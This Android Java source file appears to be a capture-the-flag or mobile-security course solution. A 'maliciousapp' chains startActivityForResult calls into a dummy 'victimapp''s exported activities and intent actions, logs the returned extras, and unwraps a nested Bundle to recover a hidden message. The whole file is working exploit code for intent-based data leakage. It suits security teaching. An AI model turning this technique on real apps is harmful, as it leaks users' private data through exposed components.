package com.example.maliciousapp;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import java.util.Iterator;

public class MainActivity extends Activity {
    private static final String TAG = "MOBIOTSEC";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onStart() {
        super.onStart();
        Intent intent1 = new Intent();
        intent1.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.PartOne"));
        if (intent1.resolveActivity(getPackageManager()) != null) {
            startActivityForResult(intent1, 1);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        for (String p: data.getExtras().keySet()) {
            Log.i(TAG, "key: " + p + " value: " + data.getExtras().get(p));
        }

        if(requestCode == 1){
            Intent intent2 = new Intent("com.example.victimapp.intent.action.JUSTASK");
            if (intent2.resolveActivity(getPackageManager()) != null) { 
                startActivityForResult(intent2, 2);
            }
        } else if(requestCode == 2){
            Intent intent3 = new Intent();
            intent3.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.PartThree"));
            if (intent3.resolveActivity(getPackageManager()) != null) {
                startActivityForResult(intent3, 3);
            }
        } else if(requestCode == 3){
            Intent intent4 = new Intent("com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE");
            if (intent4.resolveActivity(getPackageManager()) != null) {
                startActivityForResult(intent4, 4);
            }
        } else if(requestCode == 4){
            Bundle b1 = (Bundle) data.getExtras().get("follow");
            String mykey = "";
            String message = "";
            Iterator t = b1.keySet().iterator();
            boolean goOn = true;
            while(goOn) {
                while (t.hasNext()) {
                    mykey = (String) t.next();
                    message += mykey;
                    Log.i(TAG, "key: " + mykey + " value " + b1.get(mykey).toString());
                }
                try {
                    b1 = (Bundle) b1.get(mykey);
                    t = b1.keySet().iterator();
                } catch(ClassCastException cce){
                    Log.i(TAG, "casting failure");
                    break;
                }
            }
        }
    }
}
